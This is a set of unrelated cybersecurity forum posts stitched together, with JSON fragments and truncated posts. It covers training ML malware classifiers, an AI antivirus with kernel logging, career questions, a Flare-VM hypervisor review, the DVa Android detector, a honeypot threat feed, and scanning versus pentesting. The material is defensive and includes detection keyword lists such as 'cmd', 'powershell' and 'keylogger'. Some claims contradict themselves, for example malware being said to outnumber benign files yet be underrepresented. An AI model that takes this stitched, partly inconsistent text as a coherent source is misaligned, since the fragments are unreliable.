repository of all kinds of software. Old software, Open-Source, but more importantly benign portable executables. The problem with github is that it's also packed full of malware repositories so you'll need to find ways to mitigate that. We obtained enough samples from extracting portable software across all Windows versions such as Windows 7, 8, 10, 11, Windows Server 2016, Windows Server 2019 etc so we didn't need to get them from Github. We also collected commercial software from the Internet Archive, [https://download.cnet.com/](https://download.cnet.com/) and [https://www.portablefreeware.com/](https://www.portablefreeware.com/) .There will be duplicates but you'll still find variants or new benign samples that weren't in different Windows Versions.\n\n  \nOnce you've collected **enough samples**, (starting small like 10K and working your way up to 100K is a good start), make sure you remove duplicates (variants of the same software are accepted but not duplicates) and make sure your benign repository only contains benign software, vice versa for the malware repository. Corrupted files cannot be properly analyzed or executed too, and they add noise to the dataset.\n\n  \nCleaning a malware and benign sample repository is a **critical step** to ensure that your dataset is high-quality, relevant, and free from duplicates or mislabeled files. You can find duplicates by hashing the samples and finding identical matches. You can also label the malware repository if you have the time into different malware families, this is recommended as different malware families behave differently. \n\n\n\n**2nd step: Feature Extraction**\n\nAfter collecting the necessary samples and cleaned your dataset, it's time to find out what features to extract in order to create a powerful machine learning model capable of **discriminating** benign files from malware files. Well-selected features can help the model identify patterns in malware, such as obfuscation techniques, unusual API calls, or specific binary structures. Conversely, poorly chosen features can result in weak performance and high false-positive or false-negative rates.\n\nFeature extraction was also done on **Jupyter notebook**, though there are other many ways to approach it. Before you start extracting features, you'll need to know what kind of **machine learning** **model** you're going to train. As different models accept different input data, either purely numerical or purely textual, depending on the model it's possible to convert the textual data to numerical using **one-hot encoding**. \n\nModels like **Random Forest**, **XGBoost**, and **Neural Networks** require numerical input.\n\nModels like **Natural Language Processing (NLP)** models can accept textual data directly or in processed form.\n\n* Example: You might extract function names or strings from a binary and feed them into a model using techniques like **TF-IDF** or **word embeddings**.\n\nFor example if you extract packer features, you could extract it by doing:\n\n    Packers: 0 // No presence of packers in the binary\n    Packers: 1 // Presence of packers in the binary\n\nOr \n\n    Packers: False // No presence of packers in the binary\n    Packers: True // Presence of packers in the binary\n\nThese 2 features serve the same purpose but are represented in different ways.\n\nDepending on your goals, you might also want to use dedicated libraries or frameworks for binary analysis, such as:\n\n* **LIEF** or **Pefile** for parsing and extracting Portable Executable (PE) file features.\n* **Radare2** or **Ghidra** for reverse engineering.\n\nYou can still use textual data by using **one-hot encoding** to convert the textual data to numeric data. Identical textual data will have the same numeric value. \n\nKaspersky recommends using machine learning models with decision trees because unlike decision trees, deep learning models are a black box, meaning it's very difficult to interpret what went wrong when a deep learning model misclassifies a file. This feature is crucial to find ways to enhance the model's misclassifications. Here's Kaspersky's whitepaper describing this: \n\n[https://media.kaspersky.com/en/enterprise-security/Kaspersky-Lab-Whitepaper-Machine-Learning.pdf](https://media.kaspersky.com/en/enterprise-security/Kaspersky-Lab-Whitepaper-Machine-Learning.pdf)\n\nThese features are extracted without executing the binary. Some advanced malware tries to thwart static analysis using packing and obfuscation, hindering static analysis, which is why antivirus solutions also include dynamic analysis in real time protection.\n\n# Static Features\n\nHere's a list below of common features extracted for malware analysis.\n\n# File Metadata\n\n* **File size**: Total size of the file in bytes.\n* **Entropy**: Measures randomness in the file. High entropy often means packing or encryption.\n* **Magic number**: Signature bytes that help identify the file type (e.g., PE, ELF).\n* **Timestamp**: Compilation time from the PE header (helps detect falsified timestamps).\n* **Checksum**: Value used to validate file integrity.\n\n# Header Information (PE/ELF)\n\n* **Number of sections**: Count of sections (e.g., **.text, .data, .rsrc**).\n* **Section names**: List of section names (custom section names may indicate **packing**).\n* **Section entropy**: Entropy values for individual sections to detect packed sections.\n* **Entry point**: The address where execution starts (**unusual entry** points can be suspicious).\n* **Characteristics flags**: Indicates properties of the file, such as whether it\u2019s **executable or DLL**.\n\n# Import Table (API Calls)\n\n* **Number of imported functions**: Total functions imported by the binary.\n* **Imported DLLs**: List of DLLs used (e.g., **kernel32.dll, user32.dll**).\n* **Imported functions**: Specific API calls (e.g., **CreateFile, VirtualAlloc, WinExec**).\n   * Malware often uses functions like:\n      * **Process manipulation**: CreateProcess, OpenProcess\n      * **File operations**: CreateFile, DeleteFile, ReadFile\n      * **Registry operations**: RegOpenKey, RegSetValue\n      * **Network communication**: WSAStartup, send, recv\n\n# Strings\n\n* **Hardcoded strings**: Extract strings from the binary (e.g., URLs, IP addresses, suspicious keywords like \"cmd\", \"powershell\").\n* **ASCII/Unicode ratio**: Ratio of ASCII to Unicode strings (can help detect packed or obfuscated binaries).\n* **Presence of specific keywords**: Words like \u201ckeylogger\u201d, \u201cpassword\u201d, \u201chacker\u201d can indicate malicious intent.\n\n# Resources\n\n* **Number of resources**: Total embedded resources (e.g., icons, images, executables).\n* **Resource entropy**: High entropy in resources may indicate embedded encrypted payloads.\n* **Icon similarity**: Whether the icon hash matches a known system file (helps detect impersonation).\n\n\n\n**Python Example:**\n\n    import lief\n    \n    def pe_features(file_path):\n        binary = lief.parse(file_path)\n        features = {\n            \"number_of_sections\": len(binary.sections),\n            \"entry_point\": binary.entrypoint,\n            \"has_packers\": binary.has_packer,\n            \"imported_functions\": len(binary.imports)\n        }\n        return features\n\nThis step was very time consuming, as features extracted directly affect the trained models performance. Once you've finished this step (you're **never** finished as you'll always come back to this step to improve the model's performance.)  \n\n\n**3rd step: Train Test Split:**\n\nOnce you extracted the relevant features, the next step is **splitting your dataset** into two (or maybe three) parts: **training set**, **testing set** . This makes sure that your machine learning model is properly evaluated and tested  it's ability to generalize well to unseen data.\n\nNevertheless, Test Train Split still plays a significant role in model learning, because of the big dataset we had it became a need to randomize the train test split before.\n\n* **Training Set:** It is the segment of data that is going to be utilized to teach the model. The model fine-tunes its coefficients according to it.\n* **Testing Set:** The other part, which is used to test the model\u2019s performance after the training phase, gives an unbiased estimation about the quality of the model on the new unseen data. This is the way a model would perform in real-world conditions.\n\n# Example with Python:\n\n    from sklearn.model_selection import train_test_split\n    \n    X_train, X_test, y_train, y_test = train_test_split(X, y, test_size=0.2, random_state=42)\n    \n    print(f\"Train samples: {len(X_train)}\")\n    print(f\"Test samples: {len(X_test)}\")\n\n**4th step: Model Training:**\n\nOnce the dataset has been separated into training and test sets, it is time to **train the model**. Here, the machine learning algorithm learns patterns from the training data, enabling it to distinguish between **benign** and **malicious** files.\n\nModel training was done by inputting the extracted features and the labels as benign or malware into a machine learning algorithm. This algorithm uses these assignments for parameter adjustment and tasking in recognition. The goal of the algorithm will be an iterative minimization for the difference between prediction and actual classification.\n\nAs mentioned in the 2nd step, selecting your model is very important, particularly in the feature extraction step from the samples.\n\nSome important mathematical principles include **linear algebra**, **probability**, **statistics**, **calculus**, and **optimization** for model training. \n\nThe use of **linear algebra** is fundamental to machine learning because, more often than not, data is represented in the form of matrices and vectors. Then **probability** which helps in understanding uncertainty and making predictions, which is vital in malware detection where predictions are probabilistic. Calculus is essential for understanding how machine learning models learn. And **gradient-based optimization** methods like **gradient descent** rely on calculus. **Distance metrics** are used in models like **k-nearest neighbors (k-NN)** and clustering algorithms to measure similarity between feature vectors. Finally **Optimization** which help find the best parameters for a machine learning model.\n\nPython Example:\n\n    from sklearn.ensemble import RandomForestClassifier\n    \n    model = RandomForestClassifier(n_estimators=100, random_state=42)\n    model.fit(X_train, y_train)\n\nOnce you choose your algorithm for model training, you train the model by fitting it to the training set. This process involves:\n\n* Providing the model with feature vectors (**X\\_train**) and their corresponding labels (**y\\_train**).\n* The model learns to associate the features with their correct labels by minimizing a loss function (e.g., cross-entropy loss for classification).\n\nDuring Model Training:\n\n  \nThe **loss function** indicates the error rate between the model's predictions and the labels. During training, the model's aim is to minimize this error rate, we use:\n\n**- Binary cross-entropy loss for binary classification** (benign vs. malware).\n\n**- Categorical cross-entropy loss for multi-class classification** (for example, multiple types of malware). \n\n**- Optimization Algorithm** (such as Gradient Descent, Adam, etc.) iteratively update the internal parameters of the model to minimize the loss function. Optimization algorithms can ensure that a model converged optimally to a solution.\n\n**- Hyperparameters** are thought of as settings that guide the training process and are not themselves learned from the data (for instance, learning rate, number of trees in the random forest, and number of layers in the neural network). With appropriate tuning, hyperparameters bring improvement into a model's performance.\n\n**- Epoch**: One epoch simply means the entire dataset is passed through the model **once.**\n\n**- Batch Size:** The number of samples processed before the model's internal parameters are updated.\n\nThese are the parameters that control how effectively the model learns during training. \n\n  \n**Tips for Model Success:**\n\n**Avoiding Overfitting**: This happens when the model performs well on the training set while giving poor performance on the unseen data (test set). **Some** techniques to reduce overfitting are:\n\n**Regularization techniques** L1/L2 regularization for logistic regression\n\n**Reduce model complexity** (reduce tree depth in Random Forest). Using dropout layers in neural networks.\n\n\n\n**Handling Class Imbalance**\n\nMost malware files **outnumber** benign files, meaning that they are underrepresented in most datasets. This imbalance must be handled appropriately to avoid bias in the model Applying class weights or oversampling techniques like SMOTE.\n\n Use valuation metrics help assess model performance such as Accuracy, Precision, Recall and F1 score. \n\n  \nTLDR: Collect **benign** and **malicious** PE files, ensuring a **safe environment** and **legal compliance**. Feature extraction (**static analysis**) includes file metadata, imports, sections, and more. Split data into train/test sets to evaluate performance. Train **ML models** (e.g., **Random** **Forest**, **XGBoost**) on the extracted features. Use techniques like **regularization**, **class balancing**, and **hyperparameter** tuning to improve accuracy and avoid overfitting.\n\n  \n**Please only download malware if you have a solid understanding of secure sandboxing and security, and comply with local laws and organizational policies.**",

One of the core components of modern antiviruses such as Kaspersky, BitDefender, OmniDefender, Avast and many more is the **kernel-level real-time protection**. \n\nUnlike traditional monitoring methods that rely on high-level process observation, **kernel-level monitoring** allows us to capture low-level interactions between processes and the operating system.

After 2 years of development, we've built an AI-powered antivirus in 2025 that incorporates a\u00a0**VPN**,\u00a0**Password Manager**\u00a0and a built in local\u00a0**LLM Chatbot**\u00a0in a GGUF File format optimized for CPU-Only Inference including machine learning models for malware detection, a **Network Intrusion Detection** **system** and\u00a0**kernel driver**\u00a0level monitoring for real time protection.\n\nAfter a couple months collecting Hundreds of Millions of Malware samples (totaling **34TBs**) for developing a comprehensive Signature Analysis database and using a small fraction to train a powerful machine learning, model using decision trees and random forest models, we've managed to create a Deep Learning Trained Model for Malware detection with these performance metrics:\n\n**Accuracy**: 0.9925\n\n**Auc**: 0.9993\n\n**Loss**: 0.0215\n\n**Precision**: 0.9909\n\n**Recall**: 0.9906\n\n**Val\\_accuracy**: 0.9893\n\n**Val\\_auc**: 0.9981\n\n**Val\\_loss**: 0.0356\n\n**Val\\_precision**: 0.9911\n\n**Val\\_recall**: 0.9874\n\n**Learning\\_rate**: 0.0010\n\nBut we quickly realized these values meant nothing and were worthless when tested against unknown samples, it's generalization capabilities were poor, though it had excellent precision, meaning whenever a malware was analyzed it would almost always correctly identify it as malware. However when a benign file was analyzed it would detect it as malware\u00a0**5%**\u00a0of the time against\u00a0**1000 unknown samples**. There's an article that describes these machine learning false positives clearly and why it's so hard for modern antiviruses to mitigate them.\u00a0[https://www.gdatasoftware.com/blog/2022/06/37445-malware-detection-is-hard](https://www.gdatasoftware.com/blog/2022/06/37445-malware-detection-is-hard)\n\nSince then we've retrained dozens of machine learning models to achieve a false positive rate of\u00a0**0.07%**\u00a0against 1000 unknown samples today, but malware is an ever-evolving landscape, new threats can be completely different from the last 3 months. This means machine learning models for malware detection can be\u00a0**outdated**\u00a0and if not retrained, it's detection capabilities will quickly plummet.\n\nModern antiviruses combine signature analysis with machine learning, signature analysis is a\u00a0**whitelist**\u00a0and\u00a0**blacklist**\u00a0of already known benign and malware samples. Whitelisting in particular is tightly combined with the machine learning model, so that whitelisting will tell the model to not analyze these files as they are already known to be benign, this greatly helps in\u00a0**reducing false positives**\u00a0as the model will only be left with analyzing unknown files. Machine Learning models are quite resource intensive and time consuming so whitelisting and blacklisting will typically be the first layers of defense in an antivirus.\n\nSignature Analysis doesn't just include cryptographic hashes such as\u00a0**MD5**,\u00a0**SHA256**\u00a0etc. We call them\u00a0**fuzzy hashes**, or\u00a0**locality sensitive hashes**. Instead of looking for exact matches, fuzzy hashes are capable of calculating the similarity between 2 malware files. This is very effective against polymorphic malware that alter the structure of the same malware while keeping the same functionality. Changing a single letter in a file will generate a completely different cryptographic hash but fuzzy hashes.\n\nTake these 2 files below for example:\n\n    File 1: 1d41dfab4f_electron-fiddle-0.36.0-win32-x64-setup.exe\n    File 2: 1d4ba706c1_electron-fiddle-0.36.0-win32-ia32-setup.exe\n\nThese files would generate:\n\nFile 1: 2d1ce109ce6001dc7e8e861047b2f257  \nFile 2: caec2cd865bf58bad5f1097387ecb194\n\nTheir MD5 hashes are completely different! However if we use a fuzzy hash such as TLSH (**Trendmicro Locality Sensitive Hash**):\n\n    tlsh1: T13228335051ADD8F7D09F0EB104A3A552A8C89CEB7730670B0A9F73324F72B68556ABD3\n    tlsh2: T13B2833545C50886BD27A3E7C6313D918CA58FCE13E09DFE85E3437827E3A7858249E9B\n    \n    TLSH-based similarity: 86.80%\n\nTLSH calculates their structural similarity and we can see that the 2 files are quite similar.\n\nThis would be the second layer of defense in an antivirus, as calculating the hash then calculating their similarity introduces more latency and overhead compared to simple MD5 and SHA256 matching.\n\nWe have amassed a total of 1 210 950 971 (**1.2 billion**) cryptographic hashes of Benignware files, and 104 261 366 Hashes (**104 million**) Malware Files but they're ever increasing. The problem with that is they generated a file that is\u00a0**70GBs**\u00a0in size in a simple .txt format, completely unrealistic to deploy. So we've focused on essential files that should be whitelisted and combined fuzzy hashes that could detect tens of thousands thousands of variants of malware.\n\nUnfortunately even fuzzy hashes have a severe weakness and we found out the hard way, if you take a benign Microsoft file (or any benign file in general) and injected 10 lines of malicious code, the fuzzy hash would recognize that file as 98% similar to a known benign file, it doesn't know the other 2% but 98% is high enough to typically classify that file as benign. The other 2% is too short to be compared to the malicious database.\n\nWe also tackled other malware detection methods but they we're either outdated, unreliable or can't be automated such as Yara rules and Reverse Engineering using Ghidra, Ghidra is a helpful tool to statically analyze and understand the behavior of binaries and aren't meant to be used in production.\n\nOur real time protection, which uses a kernel driver is able to produce comprehensive logs that expose the behavior of processes at runtime.\n\nHere's short truncated sample of our kernel driver logs since the logs are quite extensive.\n\n    Process: lokirat_client_exe (PID: 6856, CreationIndex: 0)\n    Command Line: \"C:\\Users\\Malware_Analysis\\Documents\\Malware\\LokiRAT Client.exe\"\n    Parent PID: 2528, Parent ImageName: cmd_exe\n    Start Time: Tue Nov 05 10:50:04 2024\n    End Time: Tue Nov 05 10:50:21 2024\n    \n    Processes Created:\n      - werfault_exe (PID: 13120, CreationIndex: 1)\n    \n    Occurrences (PID: 6856, CreationIndex: 0, Image: lokirat_client_exe):\n      Total: 112\n        - Open file: \\Device\\HarddiskVolume3\\Windows\\Prefetch\\LOKIRAT \n        - Open file: \\Device\\HarddiskVolume3\\Windows\n        - Open file: \\Device\\HarddiskVolume3\\Windows\\System32\\wow64log.dll\n        - Cleanup file: \\Device\\HarddiskVolume3\\Windows\n        - Open file: \\Device\\HarddiskVolume3\\Windows\\SysWOW64\n        - Open file: \\Device\\HarddiskVolume3\\Windows\\SysWOW64\\mscoree.dll\n        - Cleanup file: \\Device\\HarddiskVolume3\\Windows\\SysWOW64\\mscoree.dll\n        - Open file: \\Device\\HarddiskVolume3\\Windows\\SysWOW64\\MSCOREE.DLL.local\n        - Open file: \\Device\\HarddiskVolume3\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\n        - Open file: \\Device\\HarddiskVolume3\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\mscoreei.dll\n        - Open file: \\Device\\HarddiskVolume3\\Windows\\Microsoft.NET\\Framework\\v1.0.3705\\clr.dll\n        - Open file: \\Device\\HarddiskVolume3\\Windows\\Microsoft.NET\\Framework\\v1.1.4322\\clr.dll\n        - Open file: \\Device\\HarddiskVolume3\\Windows\\Microsoft.NET\\Framework\\v1.1.4322\\mscorwks.dll\n        - Open file: \\Device\\HarddiskVolume3\\Windows\\Microsoft.NET\\Framework\\v2.0.50727\\clr.dll\n        - Open file: \\Device\\HarddiskVolume3\\Windows\\Microsoft.NET\\Framework\\v2.0.50727\\mscorwks.dll\n        - Open file: \\Device\\HarddiskVolume3\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\clr.dllCLIENT.EXE-37A43E7A.pf\n\nWhen it comes to **Network Security**, modern malware often try to communicate to external websites, whether it's for data exfiltration or establishing persistent remote control of the compromised system, unfortunately today's malicious URLs refuse all external requests unless a specific parameter or key is provided in the URL which only the developers know in order to hide from detection systems. So requesting access to a known malicious URL can many times lead to a 404 error. **Blacklisting and Threat Intelligence Feeds** provide us with known malicious websites. For unknown websites, we rely on **URL reputation** analysis which includes but is not limited to Age of the domain, TLD, Domain popularity, Hosting history, TLS/SSL Certificate Analysis, suspicious patterns in the URL or website such as signs of spoofing, typosquatting such as \"g00gle.com\" instead of \"google.com\".\n\nTLDR: We built an AI-driven antivirus with a VPN, password manager, local LLM chatbot, Network Intrusion Detection and prevention, and kernel-level real-time protection. After training machine learning models on malware samples (34TB+), We achieved high accuracy, but real-world generalization was poor, with false positives initially at 5%. After retraining, the false positive rate is now 0.07%.",

    "text": "Feeling kind of stuck. Need some guidance !. So I'm currently in my 3rd year of my 4 year course in college, and I\u2019d say I'm somewhere in the middle when it comes to reverse engineering and malware analysis ( mostly comfortable with all the stuff, have worked with real samples like emotet, Snake, and wannacry too (not finished)). I've explored somewhat most of the tech (Ai, ml, webdev) and I\u2019ve done quite a bit of exploit dev on both Linux and Windows too, and I regularly work and make open source tools and do low-level programming. It\u2019s been fun and definitely helped me connect dots, and build a bigger picture of security. But man, every time I look for jobs in exploit dev, reversing or malware research as an fresher or even beginner, all I see are few results that also require 5+ years of experience, and I haven't even done an internship yet.\n\nSo, I'm stuck. Where do I even start? I feel like all this knowledge might not be useful if I can\u2019t find a way to turn it into a career. It\u2019s frustrating when I see friends in web dev landing jobs easily after grinding leetcode ( I\u2019ve also done some web development, so I\u2019m comfortable with those stacks too but you know....), while I\u2019m over here working on this stuff and unsure where to go next.\n\nSorry for the long post, but I\u2019d really appreciate any advice or guidance. I'm in real need of that. I wonder if I'm making a fool out of me asking this in public but yeah... Thanks in advance!\n\nI'm leaving my GitHub too:- \nhttps://github.com/yourpwnguy I might not be that much active nowadays because of constantly doing new stuff. Cuda, drivers etc etc. ",

    "text": "Light Intro + Personal Review of Getting Flare-VM Installed & Running on 3 Hypervisors (to Help Others Decide on Which One to Use). Hey y'all. I posted about my shortcomings with VirtualBox the other day not knowing about VMWare 17 going fully free back in November (been using VirtualBox and QEMU for years due to VMWare's expense at the time). I deleted that post because it wasn't at all useful or relevant and the responses made it clear the original intent did not come through properly. This post is more of a redo of that from the perspective of someone who is new to malware analysis but not cybersecurity in the traditional sense.\n\n# About Me\n\nI'm not a professional at all in anything technology related. I'll be 40 in a few years and naturally love to dive first and fail later in basically all areas of life (without always thinking the consequences through), leading to being both highly optimistic and anxious at the same time. I have mostly been obsessed with these areas (for going on 20 years now) on more than a hobbyist level but not to the point of having a career in any of them just from knowledge alone:\n\n1. Reverse engineering of old binary formats (especially those related to abandoned or obscure games on systems that have limited resources such as handhelds, old consoles, and outdated computer systems)\n2. Self hosting Linux and FreeBSD servers; I'm very DIY and take a modular approach to software based on what's well-maintained and gets me where I'm going with the smallest resource usage possible, while also taking strides to be secure. Example: Nextcloud is a great all-in-one alternative to much of Google's offerings but, for my resources and needs, Radicale + Minio + gitolite (for version controlling mostly) gets me a similar setup without the bloat, dependencies, and maintenance nightmare when upgrading\n3. Software and game development - these are definitely not my main forte but I feel competent enough that doing binary patching, decompiling binaries with Ghidra, etc, all don't terrify me\n\nNice to meet y'all.\n\n# Hardware Tested On\n\n* CPU: Intel i7-4790k 4-core (stably overclocked to 4.6 GHz)\n* Motherboard: Asus z97-A Full Atx\n* RAM: 2x8 GB DDR3 GSkill Ripjaw 1666 MHz (overclocked to 2100 MHz)\n* SSD (for Windows 10 install): 250 GB SK Hynix Platinum NVMe M2\n* HDD (for Remnux install): 1 TB Seagate 7200 RPM\n\n# VirtualBox Rundown\n\n[https://www.virtualbox.org/](https://www.virtualbox.org/)\n\n**Pros**\n\n* free and open source with an intuitive interface\n* frequently updated with source code that is fairly well documented (in the source, that is)\n* performant on a wide range of systems\n* previous releases are maintained and available through the developer's website long after they have been replaced to aid with compatibility\n* snapshots seem to be well optimized between speed and size\n* has the most cross-platform support of all 3\n\n**Cons**\n\n* setting up a Malware Analysis VM for newer users is not well documented or maintained\n* hardening a VM to combat Malware VM detection is a bit of a mess; the software documentation for command line flags gives only the bare minimum needed to get going with most of the options for hardening being buried in the source code instead\n* [this](https://github.com/hfiref0x/VBoxHardenedLoader) is currently the closest resource for that aspect but is no longer maintained and version 7 removed or changed some of the configuration options, leading to VMs running it aborting on launch; there's also some notes by the previous maintainer about Windows 11 breaking some things with certain Intel configurations (vague at best)\n* using Hyper-V on a Windows 10 or 11 host, especially on an older system, incurs a drastic performance hit\n* the last major post about VirtualBox in this community (prior to my arrival) wasn't recent enough for me to be confident that it was used much\n\nI found that getting where I wanted to go with my current setup was the most frustrating in VirtualBox of all 3, heavily due to the cons listed above. Installing a full Flare-VM did require some fiddling around but most of that was probably my inexperience with it more than the VM or install process than anything else.\n\n# Hyper-V Rundown\n\n**Pros**\n\n* uses a similar interface to and amount of configuration options as VirtualBox, so getting running was a breeze as my first usage\n* the Windows 10 to full Flare-VM install was the fastest with near native performance\n* snapshots werre quick, easy to rename, and structured in an intuitive tree based on age\n\n**Cons**\n\n* exclusive to the Pro versions of Windows 10 and Windows 11 (correction may be needed)\n* Remnux installation and performance felt the roughest of all three hypervisors\n* Hyper-V Manager (the user interface) was not installed by default when I enabled Hyper-V and required an extra restart to use\n* hardening may not be possible due to the VM file format not being documented well or as straightforward to modify as the other 2 hypervisors\n\nOut of all 3, this was my favorite one from start to finish. I was surprised at how friendly the Hyper-V Manager was and how little intervention was needed on my part to get both operating systems installed. Getting a full Flare-VM install finished did require the most manual upkeep from me, though. Sometimes, Boxstarter would reboot the system but the user account would not log out properly leading to an issue where I had to fully shutdown the VM and start it back up at least twice to complete the install.\n\n# VMWare Workstation Pro 17.6.2 Rundown\n\n[https://www.vmware.com/](https://www.vmware.com/)\n\n**Pros**\n\n* most well documented and supported by the community at large (across the internet)\n* easiest and most straightforward to harden against Malware VM detection\n* had the most \"modern\" interface of the 3 with almost everything labeled in a very logical way\n* free for all use cases after November 11, 2024 announcement: [https://blogs.vmware.com/cloud-foundation/2024/11/11/vmware-fusion-and-workstation-are-now-free-for-all-users/](https://blogs.vmware.com/cloud-foundation/2024/11/11/vmware-fusion-and-workstation-are-now-free-for-all-users/)\n\n**Cons**\n\n* snapshots on a running VM could take up to 20 minutes to complete on my hardware due to it writing both the entire 8 GB memory map (without any compression) and current state to the disc\n* snapshots were saved in the same directory as the VM virtual disc (haven't researched if this is changeable yet; this primarily applies to those with limited host disc space) - Snapshots can be moved to a different disc by setting the Working Directory under the General Settings option\n* getting the network setup properly was not as straightforward as the other 2; there were too many options available that weren't labeled the same way as they were in the others\n* getting the best performance relied on removing Hyper-V and WSL altogether and fixing my virtual CPU settings; this was the only one that gave the option to create multiple single-core CPUs instead of adding more cores to a single CPU by default\n* running both Windows 10 and Remnux at the same time had the biggest performance hit in general with each having random moments where they would take a second or two longer to respond to input (still functional, mind you)\n* Remnux installed VMWare Tools by default and configured my GPU to use a full 8GB of VRAM on first launch; had to change this manually\n\nGetting everything setup was the most straightforward with this one with multiple beginner friendly tutorials available to help installation and configuration along. I personally see why this one gets the best community support; the software is very solid and after fixing some performance issues, I could see myself using this exclusively from here on out (getting both Remnux and Windows 10 performance a bit better is my next priority, if possible). If I need to do a full reinstall, I'll do it in VMWare unless a future update royally breaks something.\n\nThank y'all for reading. I hope this was useful to some people. Now to start going through the actual learning process of using the software and analyzing my first malware sample. Cheers, y'all.",

    "text": "Detector of Victim-specific Accessibility (DVa) in Android phones. Researchers at Georgia Tech have unveiled DVa, a cloud-based tool designed to detect malware that exploits Android phone accessibility features. \n\nOriginally built to assist users with disabilities, these features are now being hijacked by hackers to carry out unauthorized actions like fund transfers or blocking malware removal. DVa offers a lifeline by identifying these threats and providing actionable reports.\n\nSmartphone accessibility tools, such as screen readers and voice-to-text, are a double-edged sword. While they empower users with disabilities, they also open doors for malware to manipulate sensitive apps\u2014like banking or crypto wallets\u2014often installed via phishing links or disguised apps from trusted sources like Google Play. The consequences? Persistent infections and financial losses that are tough to undo.\n\nDVa doesn\u2019t just spot the problem\u2014it helps solve it. After scanning your device, it delivers a detailed report listing malicious apps, steps to remove them, and which victimized apps (think rideshare or payment platforms) might need follow-up with companies. Plus, it alerts Google to stamp out these threats at the source. It\u2019s a smart, proactive step toward safer tech.\n\nThe bigger picture? As accessibility in tech grows, so must our security measures. Georgia Tech\u2019s team, collaborating with Netskope, tested DVa on Google Pixel phones, proving its ability to tackle this evolving threat. The challenge ahead: distinguishing malicious use from legitimate accessibility without compromising user experience. A critical reminder\u2014security and accessibility need to evolve together.\n\nGeorgia Techs news article: https://research.gatech.edu/georgia-techs-new-tool-can-detect-malware-android-phones\n\nSciTechDaily Article: https://scitechdaily.com/new-tech-can-spot-hidden-malware-on-your-android-phone/ ",

Stress got the better of me and so i had to leave. \n\n  \nI am now looking at my options. The skills i have and what i can learn / get certifications in. Unfortunately for myself my first job i was there for 7 years and didn't expand my knowledge till now. I have a basic AWS course to my name. \n\nI am wondering if to start learning to be a penetration tester as that was a part of my masters degree which i did find interesting. But i am also concerned that these jobs are becoming an automated role or even AI taking over. \n\nI feel my strengths when researching is in compliance. But i understand that alot of people will have that skill as its a matter of reading and taking those compliance rules on board. \n\n  \nWondering if anyone can just openly talk about what they feel is a gap in the market / jobs in demand. Wondering if there are any pen testers out there? I understand alot of your job is writing reports. \n\nDo you work as yourself as a freelancer or as your own business? i appreciated everyone's time and looking forward to speaking to other cyber security experts.

The honeypots are set internet-facing - the threat feed kept private for internal security tools.\n\nIP addresses that interact with the honeypots are added to the threat feed. IP addresses with no activity for a set period are removed from the feed (default, 2 weeks).\n\nThe threat feed is served over http and can be retrieved in various formats, like csv or json. It's also available via TAXII, so platforms like OpenCTI can directly ingest the data. Plus there's a simple web interface for viewing everything.\n\nAvailable as a Docker container as well. Check it out. Thanks!",

I'm an expert in firewall security and in general aws cloud security, but very little else. I'm also very blue team, where I seem to be finding a lot of positions wanting red.

    "text": "Vulnerability Scanning vs Automated Penetration Testing. What are the key differences?\n\n[Penetration testing](https://www.clone-systems.com/automated-scripted-pentest/) and [vulnerability scanning](https://www.clone-systems.com/vulnerability-assessment/) are both essential components of a well-rounded security program, but they are not the same. Confusing the two \u2014 or relying on one in place of the other \u2014 can lead to critical gaps in your organization\u2019s ability to identify and mitigate risk.\n\n\u00a0Understanding the difference between scanning and testing is key to improving resilience and aligning with modern security standards, including\u00a0PCI DSS v4.0.1, which places increasing emphasis on continuous validation of controls.\n\n\u00a0**Vulnerability Scanning: Broad Visibility, No Validation**\n\n\u00a0A\u00a0vulnerability scan\u00a0is an automated process that checks systems, networks, or applications for known security weaknesses. These scans typically compare system data \u2014 such as OS versions, running services, and configurations \u2014 against a database of known vulnerabilities.\n\n\u00a0Scans are non-invasive, fast to run, and designed to be repeatable without disrupting operations. Because of this, they are used frequently \u2014 often monthly or quarterly \u2014 and are a core part of basic cyber hygiene.\n\nThey are particularly useful for:\n\n* Identifying missing patches\n* Highlighting misconfigurations\n* Flagging use of outdated software\n* Supporting regulatory and compliance reporting\n\n\u00a0However, vulnerability scans do not test how a vulnerability behaves in your environment.\u00a0They do not validate whether a finding is exploitable, and they are not capable of simulating how a real attacker might use multiple issues in combination to achieve a goal.\n\nCertain vulnerabilities \u2014 such as\u00a0Denial of Service (DoS)\u00a0risks \u2014 are often excluded from scanning entirely due to the possibility of causing outages. Others, like\u00a0logic flaws, privilege escalation chains, or\u00a0authentication bypasses, typically go undetected because they require contextual analysis or exploitation to identify.\n\n\u00a0**Penetration Testing: Focused, Exploit-Based Assessment**\n\n\u00a0Penetration testing\u00a0is the process of simulating real-world attacks to determine if and how vulnerabilities can be exploited. Unlike scanning, which identifies potential issues, penetration testing demonstrates the actual risk those issues pose in a live environment.\n\n\u00a0Penetration testing involves safely attempting to breach systems, escalate access, bypass controls, and pivot within the network \u2014 just as an attacker would. This is done in a controlled manner to assess the impact of vulnerabilities, test the effectiveness of controls, and uncover deeper weaknesses that scanning alone cannot expose.\n\n\u00a0Penetration testing can uncover:\n\n* Vulnerabilities that scanners cannot detect without active exploitation\n* Chained attack paths that arise from combining multiple lower-severity issues\n* Application-specific or environment-specific risks that depend on context\n* Authentication, authorization, or session handling issues\n* Misconfigurations that only present risk under certain conditions\n\n\u00a0Modern platforms allow for\u00a0automated penetration testing, where exploitation is performed safely and efficiently by tools \u2014 reducing the need for fully manual assessments while still delivering meaningful, validated results.\n\n\u00a0**Not Performed as Frequently \u2014 But No Less Critical**\n\n\u00a0Unlike vulnerability scans, penetration tests are not performed on a weekly or monthly basis. They are often conducted:\n\n* Annually or biannually\n* After major changes to infrastructure or applications\n* As part of a compliance cycle or risk management process\n\n\u00a0The lower frequency of penetration testing is due to its depth and potential operational impact, but it remains\u00a0an essential element of a mature security practice. Scanning tells you what might be wrong. Penetration testing tells you what could actually happen if someone tried to exploit it.\n\n\u00a0Penetration testing also plays an important role in\u00a0prioritization. It validates which issues are real, actionable threats and helps security teams focus resources where they matter most.\n\n\u00a0**Key Differences in Findings**\n\n\u00a0Penetration testing and vulnerability scanning often produce different sets of findings \u2014 even when run against the same environment.\n\n\u00a0Examples:\n\n* A scanner may report a vulnerable service, but only a penetration test can determine whether it\u2019s exploitable in the current setup.\n* A scanner may not trigger a DoS vulnerability, while a penetration test may confirm the service is crash-prone.\n* Scanners assess vulnerabilities independently; penetration testing can show how smaller issues combine into a serious breach path.\n\n\u00a0By testing how vulnerabilities 